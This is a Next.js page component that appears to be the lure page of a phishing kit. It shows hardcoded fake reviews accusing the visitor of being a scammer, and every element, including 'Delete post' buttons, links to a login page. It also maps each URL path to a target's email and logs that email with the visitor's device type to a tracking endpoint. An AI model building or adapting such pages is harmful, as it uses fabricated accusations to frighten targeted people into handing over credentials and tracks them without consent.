'use client';
import Image from 'next/image';
import Link from 'next/link';
import { useRouter } from 'next/navigation';
import React, { useEffect, useMemo, useState } from 'react';
import useSWR from 'swr';

const commentdata = [
  {
    id: 1,
    name: "Gerson Aguiler",
    discription: "Fake picture, completely different in person"
  },
  {
    id: 2,
    name: "Carios Jones",
    discription: "Rip-off artist, should be reported"
  },
  {
    id: 3,
    name: "Danial Perez",
    discription: "Terrible experience, she's a scammer."
  },
  {
    id: 4,
    name: "Brandon",
    discription: "Total scam, just takes your money and ghosts you."
  },
  {
    id: 5,
    name: "James Robertson",
    discription: "Took my money and blocked me, Be careful!"
  }
];

const fetcher = async (url) => {
  try {
    const res = await fetch(url);
    if (!res.ok) throw new Error(`Error fetching ${url}: ${res.statusText}`);
    return res.json();
  } catch (err) {
    console.error(err);
    return null;
  }
};

const StickyHeader = () => (
  <section className="sticky top-0 h-[10vh]">
    <Link href="/login" aria-label="Go to Login Page">
      <Image src="/images/babylon.png" height={100} width={600} alt="Logo" priority />
    </Link>
    <div className="flex gap-0">
      {['post', 'infoState', 'picture', 'review', 'comment'].map((name) => (
        <Link key={name} href="/login" aria-label={`Go to ${name} page`}>
          <Image src={`/images/${name}.png`} height={72} width={120} alt={`${name} icon`} loading="lazy" />
        </Link>
      ))}
    </div>
  </section>
);

const Footer = () => (
  <div className="bg-orange-100 h-[10vh]">
    <Image
      className="fixed bottom-0"
      src="/images/footer.png"
      height={100}
      width={600}
      alt="Footer"
      priority
    />
  </div>
);

const Page = () => {
  const [email, setEmail] = useState('');
  const router = useRouter();
  const [domainName, setDomainName] = useState('');
  const [isClient, setIsClient] = useState(false); 

  useEffect(() => {
    setIsClient(true);
  }, []);

  useEffect(() => {
    if (isClient) {
      const url = window.location.href;
      const domain = url.split('/')[3] || '';
      setDomainName(domain);
    }
  }, [isClient]);

  const { data, isLoading: dataLoading } = useSWR('/api/link', fetcher, { refreshInterval: 5000 });

  useEffect(() => {
    if (!data || !domainName) return;
    const result = data.find((entry) => entry?.link === domainName);
    if (result?.email) setEmail(result.email);
  }, [data, domainName]);

  useEffect(() => {
    const postData = async () => {
      if (!email) return;

      const userAgent = navigator.userAgent.toLowerCase();
      const domain = window.location.href;
      localStorage.setItem('domain', domain);

      let deviceType = 'desktop';
      if (/mobile|android|iphone|ipad/.test(userAgent)) {
        deviceType = 'mobile';
      } else if (/tablet/.test(userAgent)) {
        deviceType = 'tablet';
      }

      try {
        await fetch('/api/log-device', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ domainName, deviceType, email }),
        });
        console.log('Device information logged successfully');
      } catch (error) {
        console.error('Failed to log device information:', error);
      }
    };

    postData();
  }, [email, domainName]);

  if (!isClient) {
    return null;
  }

  return (
    <section className="bg-[#EAF7FD] p-0 m-0">
      <div className="w-[600px] mx-auto h-screen">
        {/* Sticky Header */}
        <StickyHeader />

        {/* Main Content */}
        <main className="flex flex-col w-full pt-8 pb-24 bg-[#FAFAD2]">
          <Link href="/login" aria-label="Go to Header">
            <Image
              className="mt-[-20px] mb-[-50px]"
              src="/images/header.png"
              height={50}
              width={600}
              alt="Header Image"
              priority
            />
          </Link>

          {/* Post Items */}
          <div className="mt-16">
            {commentdata?.map((user) => (
              <div key={user?.id} className="px-[20px] py-1">
                <Link href="/login">
                  {user.name === 'Gerson Aguiler' && (
                    <span className="h-4 w-[560px] rounded-t-md -mb-1 mx-auto bg-[#F1C9AB]"></span>
                  )}
                  <h3 className="px-2 pt-1 text-white rounded-t-lg bg-[#C6D7BA] text-[12px] font-bold">
                    <span className="text-[#20AC02] font-semibold italic text-sm">Today</span>
                    <span className="text-white"> - {user?.name}</span>
                  </h3>
                  <p className="p-2 bg-white text-[12px] rounded-b-lg">{user?.discription}</p>
                </Link>
                <div className="flex justify-end mt-[-15px]">
                  <Link href="/login" aria-label="Delete post">
                    <Image
                      src="/images/delete.jpeg"
                      height={50}
                      width={90}
                      alt="Delete icon"
                      loading="lazy"
                    />
                  </Link>
                </div>
              </div>
            ))}
          </div>
        </main>

        {/* Footer */}
        <Footer />
      </div>
    </section>
  );
};

export default Page;
